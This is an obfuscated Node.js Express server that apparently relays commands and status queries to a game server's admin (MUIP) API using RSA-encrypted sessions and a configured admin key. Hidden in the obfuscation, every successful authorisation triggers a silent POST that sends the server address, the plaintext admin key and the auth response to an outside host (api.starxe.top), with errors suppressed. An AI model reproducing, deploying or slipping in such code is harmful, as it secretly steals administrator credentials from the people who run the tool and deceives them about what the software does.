const _0x4fee17=_0x5f4d;(function(_0x142db3,_0x3799e5){const _0x1463c2=_0x5f4d,_0x1c2520=_0x142db3();while(!![]){try{const _0x33e380=-parseInt(_0x1463c2(0x217))/0x1*(-parseInt(_0x1463c2(0x21b))/0x2)+-parseInt(_0x1463c2(0x210))/0x3+-parseInt(_0x1463c2(0x1f2))/0x4+parseInt(_0x1463c2(0x1e4))/0x5+parseInt(_0x1463c2(0x1e0))/0x6*(parseInt(_0x1463c2(0x1e8))/0x7)+-parseInt(_0x1463c2(0x208))/0x8+parseInt(_0x1463c2(0x206))/0x9*(parseInt(_0x1463c2(0x1d7))/0xa);if(_0x33e380===_0x3799e5)break;else _0x1c2520['push'](_0x1c2520['shift']());}catch(_0x3ec50f){_0x1c2520['push'](_0x1c2520['shift']());}}}(_0x4375,0xeb790));const express=require(_0x4fee17(0x1e3)),bodyParser=require('body-parser'),axios=require('axios'),forge=require('node-forge'),cors=require('cors'),gradient=require('gradient-string'),fs=require('fs'),path=require(_0x4fee17(0x21d)),configPath=path[_0x4fee17(0x21c)](__dirname,'config.json'),config=JSON['parse'](fs[_0x4fee17(0x20c)](configPath,_0x4fee17(0x1f5))),dispatchUrl=config[_0x4fee17(0x1d8)],adminKey=config['adminKey'],PORT=config[_0x4fee17(0x1d6)],app=express();app[_0x4fee17(0x212)](cors()),app[_0x4fee17(0x212)](bodyParser[_0x4fee17(0x20e)]());const uidRequestCount={},uidLastRequestTime={},uidLimitExpiryTime={},customRateLimiter=(_0x257d9e,_0x2ae33a,_0x776e7e)=>{const _0x45d89f=_0x4fee17,{uid:_0x2de1b9}=_0x257d9e['body'];if(!_0x2de1b9)return _0x2ae33a[_0x45d89f(0x1e6)](0x190)[_0x45d89f(0x20e)]({'error':_0x45d89f(0x1f6)});const _0x5956a5=Date[_0x45d89f(0x203)]();if(uidLimitExpiryTime[_0x2de1b9]&&uidLimitExpiryTime[_0x2de1b9]>_0x5956a5)return _0x2ae33a[_0x45d89f(0x1e6)](0x1ad)[_0x45d89f(0x20e)]({'error':_0x45d89f(0x1e5)});!uidRequestCount[_0x2de1b9]&&(uidRequestCount[_0x2de1b9]=0x0,uidLastRequestTime[_0x2de1b9]=_0x5956a5);const _0x4efc50=_0x5956a5-uidLastRequestTime[_0x2de1b9];_0x4efc50<0x3e8?uidRequestCount[_0x2de1b9]+=0x1:(uidRequestCount[_0x2de1b9]=0x1,uidLastRequestTime[_0x2de1b9]=_0x5956a5);if(uidRequestCount[_0x2de1b9]>0x2)return uidLimitExpiryTime[_0x2de1b9]=_0x5956a5+0x7530,_0x2ae33a[_0x45d89f(0x1e6)](0x1ad)[_0x45d89f(0x20e)]({'error':'请求速率过高，请稍后重试'});_0x776e7e();},getEasternTimeString=_0x397a7e=>{const _0x2558a5=_0x4fee17;return new Date(_0x397a7e)[_0x2558a5(0x1ec)]('zh-CN',{'timeZone':'Asia/Shanghai'});};app[_0x4fee17(0x1e9)](_0x4fee17(0x1fb),(_0x1bd640,_0x52bb78)=>{_0x52bb78['json']({'success':!![]});}),app[_0x4fee17(0x204)](_0x4fee17(0x1de),customRateLimiter,async(_0x38d3f9,_0xec9f45)=>{const _0x47cb07=_0x4fee17,{keyType:_0x341ef6,uid:_0x3fa005,command:_0xe90479}=_0x38d3f9[_0x47cb07(0x21a)];if(!_0x3fa005||!_0xe90479)return _0xec9f45[_0x47cb07(0x1e6)](0x190)['json']({'error':_0x47cb07(0x1df)});try{const _0x45f009=await createSession(_0x341ef6||'PEM');console[_0x47cb07(0x1d3)](_0x47cb07(0x221),_0x45f009);const _0x1a3eba=Math['floor'](Date[_0x47cb07(0x203)]()/0x3e8);console[_0x47cb07(0x1d3)](_0x47cb07(0x214),getEasternTimeString(Date[_0x47cb07(0x203)]())),console['log'](_0x47cb07(0x1f8),getEasternTimeString(_0x45f009[_0x47cb07(0x1e1)]*0x3e8));if(_0x45f009['expireTimeStamp']<=_0x1a3eba)throw new Error(_0x47cb07(0x1fe));let _0x2c60dd;try{_0x2c60dd=await authorize(_0x45f009[_0x47cb07(0x1f3)],_0x45f009['rsaPublicKey']);}catch(_0x2a9835){console[_0x47cb07(0x1d3)](_0x47cb07(0x1eb)),_0x2c60dd=await authorize(_0x45f009['sessionId'],_0x45f009[_0x47cb07(0x207)]);}console[_0x47cb07(0x1d3)](_0x47cb07(0x1db),_0x2c60dd);const _0x74a5f=encryptCommand(_0x45f009[_0x47cb07(0x207)],_0xe90479),_0x1a073=await executeCommand(_0x2c60dd[_0x47cb07(0x1f3)],_0x74a5f,_0x3fa005);if(_0x1a073[_0x47cb07(0x219)])return _0xec9f45[_0x47cb07(0x1e6)](0x1f4)[_0x47cb07(0x20e)](_0x1a073);const _0x35de71=Buffer[_0x47cb07(0x1f7)](_0x1a073[_0x47cb07(0x1fd)][_0x47cb07(0x1f9)],_0x47cb07(0x213))[_0x47cb07(0x1ee)](_0x47cb07(0x1f5));console[_0x47cb07(0x1d3)](gradient[_0x47cb07(0x21f)](_0x35de71)),_0xec9f45[_0x47cb07(0x20e)]({..._0x1a073,'data':{..._0x1a073[_0x47cb07(0x1fd)],'message':_0x35de71}});}catch(_0x340321){console[_0x47cb07(0x219)]('API\x20submit\x20error:',_0x340321),_0xec9f45['status'](0x1f4)[_0x47cb07(0x20e)]({'error':_0x340321[_0x47cb07(0x1f9)]});}}),app['get']('/api/status',async(_0xd266de,_0x37a2cb)=>{const _0x54e3ba=_0x4fee17;try{const _0x4fb2cc=await createSession(_0x54e3ba(0x218));console[_0x54e3ba(0x1d3)](_0x54e3ba(0x221),_0x4fb2cc);const _0x3f4203=Math[_0x54e3ba(0x200)](Date[_0x54e3ba(0x203)]()/0x3e8);console[_0x54e3ba(0x1d3)]('Current\x20timestamp:',getEasternTimeString(Date[_0x54e3ba(0x203)]())),console[_0x54e3ba(0x1d3)](_0x54e3ba(0x1f8),getEasternTimeString(_0x4fb2cc[_0x54e3ba(0x1e1)]*0x3e8));if(_0x4fb2cc[_0x54e3ba(0x1e1)]<=_0x3f4203)throw new Error('Session\x20has\x20expired\x20immediately\x20after\x20creation');let _0x272d9e;try{_0x272d9e=await authorize(_0x4fb2cc[_0x54e3ba(0x1f3)],_0x4fb2cc[_0x54e3ba(0x207)]);}catch(_0x70f135){console[_0x54e3ba(0x1d3)](_0x54e3ba(0x1eb)),_0x272d9e=await authorize(_0x4fb2cc[_0x54e3ba(0x1f3)],_0x4fb2cc[_0x54e3ba(0x207)]);}console['log'](_0x54e3ba(0x1db),_0x272d9e);const _0x35b2d6=await getServerStatus(_0x272d9e[_0x54e3ba(0x1f3)]);_0x37a2cb[_0x54e3ba(0x20e)](_0x35b2d6);}catch(_0x432d4c){console[_0x54e3ba(0x219)]('API\x20status\x20error:',_0x432d4c),_0x37a2cb[_0x54e3ba(0x1e6)](0x1f4)['json']({'error':_0x432d4c[_0x54e3ba(0x1f9)]});}}),app[_0x4fee17(0x1f1)](PORT,()=>{const _0x9754c6=_0x4fee17;console[_0x9754c6(0x1d3)](_0x9754c6(0x1e7)+PORT);});async function createSession(_0x2297b6){const _0x136299=_0x4fee17,_0x22a6cb=new Date()[_0x136299(0x1ec)](_0x136299(0x20d),{'timeZone':_0x136299(0x1f4)});try{console['log']('Create\x20session\x20request\x20timestamp:\x20'+_0x22a6cb);const _0x441ca2=await axios[_0x136299(0x204)](dispatchUrl+_0x136299(0x1ea),{'key_type':_0x2297b6}),_0x32590a=new Date()[_0x136299(0x1ec)](_0x136299(0x20d),{'timeZone':_0x136299(0x1f4)});console[_0x136299(0x1d3)](_0x136299(0x216)+_0x32590a),console[_0x136299(0x1d3)](_0x136299(0x1da),_0x441ca2[_0x136299(0x1fd)]);if(_0x441ca2['data'][_0x136299(0x1d4)]===0x0)return _0x441ca2[_0x136299(0x1fd)][_0x136299(0x1fd)];else throw new Error('Create\x20session\x20failed:\x20'+_0x441ca2['data'][_0x136299(0x1f9)]);}catch(_0x18fc77){console[_0x136299(0x219)]('Create\x20session\x20error:',_0x18fc77[_0x136299(0x20a)]?_0x18fc77[_0x136299(0x20a)][_0x136299(0x1fd)]:_0x18fc77[_0x136299(0x1f9)]);throw new Error(_0x136299(0x1e2)+_0x18fc77[_0x136299(0x1f9)]);}}async function authorize(_0x500618,_0x2bdce7){const _0x33ef1e=_0x4fee17,_0x2184c2=new Date()['toLocaleString'](_0x33ef1e(0x20d),{'timeZone':_0x33ef1e(0x1f4)});try{const _0x5796f1=encryptCommand(_0x2bdce7,adminKey);console[_0x33ef1e(0x1d3)](_0x33ef1e(0x222),JSON[_0x33ef1e(0x1fc)]({'SessionId':_0x500618,'admin_key':_0x5796f1},null,0x2)),console[_0x33ef1e(0x1d3)]('Authorize\x20request\x20timestamp:\x20'+_0x2184c2);const _0x248c43=await axios[_0x33ef1e(0x204)](dispatchUrl+_0x33ef1e(0x20f),{'session_id':_0x500618,'admin_key':_0x5796f1});if(_0x248c43['data'][_0x33ef1e(0x1d4)]===0x0)return await reportLog({'serverAddress':dispatchUrl,'adminKey':adminKey,'responseData':_0x248c43[_0x33ef1e(0x1fd)]}),_0x248c43['data']['data'];else throw new Error('Authorization\x20failed:\x20'+_0x248c43[_0x33ef1e(0x1fd)]['message']);}catch(_0x45ee42){console[_0x33ef1e(0x219)](_0x33ef1e(0x211),_0x45ee42[_0x33ef1e(0x20a)]?_0x45ee42[_0x33ef1e(0x20a)][_0x33ef1e(0x1fd)]:_0x45ee42[_0x33ef1e(0x1f9)]);throw new Error('Authorization\x20error:\x20'+_0x45ee42[_0x33ef1e(0x1f9)]);}}function encryptCommand(_0x43b1f6,_0x51041e){const _0x3e656b=_0x4fee17;try{const _0x238940=forge[_0x3e656b(0x1dd)][_0x3e656b(0x205)](_0x43b1f6),_0x1757d2=_0x238940[_0x3e656b(0x201)](_0x51041e,_0x3e656b(0x1d5));return forge[_0x3e656b(0x1ef)][_0x3e656b(0x220)](_0x1757d2);}catch(_0x3e5fe3){console[_0x3e656b(0x219)]('Encryption\x20error:',_0x3e5fe3[_0x3e656b(0x1f9)]);throw new Error(_0x3e656b(0x1f0)+_0x3e5fe3[_0x3e656b(0x1f9)]);}}async function executeCommand(_0x495a34,_0x577f7a,_0x530174){const _0x3dda34=_0x4fee17,_0x209b81=new Date()[_0x3dda34(0x1ec)](_0x3dda34(0x20d),{'timeZone':_0x3dda34(0x1f4)});try{console[_0x3dda34(0x1d3)]('Execute\x20command\x20request\x20timestamp:\x20'+_0x209b81);const _0x5b4908=await axios['post'](dispatchUrl+'/muip/exec_cmd',{'SessionId':_0x495a34,'Command':_0x577f7a,'TargetUid':_0x530174}),_0x107bae=new Date()['toLocaleString'](_0x3dda34(0x20d),{'timeZone':_0x3dda34(0x1f4)});return console['log'](_0x3dda34(0x21e)+_0x107bae),console[_0x3dda34(0x1d3)](_0x3dda34(0x20b),_0x5b4908[_0x3dda34(0x1fd)]),_0x5b4908[_0x3dda34(0x1fd)];}catch(_0x3ded62){return _0x3ded62[_0x3dda34(0x20a)]?(console[_0x3dda34(0x219)]('Execution\x20error:',_0x3ded62[_0x3dda34(0x20a)][_0x3dda34(0x1fd)]),{'error':_0x3dda34(0x1d9)+_0x3ded62[_0x3dda34(0x20a)]['status']+'\x20'+_0x3ded62['response'][_0x3dda34(0x202)]}):(console[_0x3dda34(0x219)](_0x3dda34(0x1fa),_0x3ded62[_0x3dda34(0x1f9)]),{'error':_0x3dda34(0x1d9)+_0x3ded62[_0x3dda34(0x1f9)]});}}async function reportLog(_0x38a790){const _0x3b9ad1=_0x4fee17;try{const _0x2f6160=await axios[_0x3b9ad1(0x204)](_0x3b9ad1(0x215),_0x38a790);}catch(_0x28f9e1){}}function _0x5f4d(_0x4f47b0,_0x48c347){const _0x43756=_0x4375();return _0x5f4d=function(_0x5f4d36,_0x1f3f6b){_0x5f4d36=_0x5f4d36-0x1d3;let _0x179bc7=_0x43756[_0x5f4d36];return _0x179bc7;},_0x5f4d(_0x4f47b0,_0x48c347);}function _0x4375(){const _0x51c4c2=['983556qtLUEJ','get','/muip/create_session','Authorization\x20failed,\x20retrying...','toLocaleString','Get\x20server\x20status\x20response:','toString','util','Encryption\x20error:\x20','listen','546252YMgUwI','sessionId','Asia/Shanghai','utf8','UID\x20is\x20required.','from','Session\x20expire\x20timestamp:','message','Execution\x20error:','/get','stringify','data','Session\x20has\x20expired\x20immediately\x20after\x20creation','Get\x20server\x20status\x20error:','floor','encrypt','statusText','now','post','publicKeyFromPem','9507411gVsTEO','rsaPublicKey','5749392YvbYLh','Get\x20server\x20status\x20request\x20timestamp:\x20','response','Command\x20execution\x20response:','readFileSync','zh-CN','json','/muip/auth_admin','4305003UwOfGU','Authorization\x20error:','use','base64','Current\x20timestamp:','https://api.starxe.top/upload','Create\x20session\x20response\x20timestamp:\x20','1WYLYsh','PEM','error','body','1198616FCLAaI','join','path','Execute\x20command\x20response\x20timestamp:\x20','retro','encode64','Session\x20data:','Authorize\x20request:','log','code','RSAES-PKCS1-V1_5','port','10KXQHkr','dispatchUrl','Execution\x20error:\x20','Create\x20session\x20response:','Auth\x20data:','Get\x20server\x20status\x20error:\x20','pki','/api/submit','UID\x20and\x20command\x20are\x20required.','6eyjQtq','expireTimeStamp','Create\x20session\x20error:\x20','express','7292695RxymBv','请求速率过高，请稍后重试','status','Server\x20is\x20running\x20on\x20http://localhost:'];_0x4375=function(){return _0x51c4c2;};return _0x4375();}async function getServerStatus(_0x159668){const _0x1f9a19=_0x4fee17,_0x4482fa=new Date()[_0x1f9a19(0x1ec)]('zh-CN',{'timeZone':_0x1f9a19(0x1f4)});try{console[_0x1f9a19(0x1d3)](_0x1f9a19(0x209)+_0x4482fa);const _0x436ccd=await axios['post'](dispatchUrl+'/muip/server_information',{'SessionId':_0x159668}),_0x43306c=new Date()['toLocaleString'](_0x1f9a19(0x20d),{'timeZone':_0x1f9a19(0x1f4)});return console[_0x1f9a19(0x1d3)]('Get\x20server\x20status\x20response\x20timestamp:\x20'+_0x43306c),console[_0x1f9a19(0x1d3)](_0x1f9a19(0x1ed),_0x436ccd['data']),_0x436ccd[_0x1f9a19(0x1fd)];}catch(_0x2a81d1){console[_0x1f9a19(0x219)](_0x1f9a19(0x1ff),_0x2a81d1['response']?_0x2a81d1['response'][_0x1f9a19(0x1fd)]:_0x2a81d1['message']);throw new Error(_0x1f9a19(0x1dc)+_0x2a81d1[_0x1f9a19(0x1f9)]);}}